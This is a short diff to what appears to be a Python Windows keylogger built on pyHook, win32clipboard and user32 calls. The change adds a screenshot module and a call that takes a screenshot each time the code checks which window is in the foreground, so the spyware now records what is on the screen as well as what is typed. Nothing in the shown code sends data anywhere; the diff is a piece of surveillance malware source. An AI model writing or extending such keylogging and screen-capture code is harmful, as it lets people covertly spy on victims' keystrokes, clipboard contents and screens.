@@ -2,6 +2,7 @@ from ctypes import *
 import pythoncom
 import pyHook
 import win32clipboard
+import screenshot
 
 user32          = windll.user32
 kernel32        = windll.kernel32
@@ -9,6 +10,11 @@ psapi           = windll.psapi
 current_window  = None
 
 def get_current_process():
+
+    print '[*] Made screenshot'
+    screenshot.save_screenshot()
+
+    
     hwnd = user32.GetForegroundWindow()
     pid = c_ulong(0)
     user32.GetWindowThreadProcessId(hwnd, byref(pid))
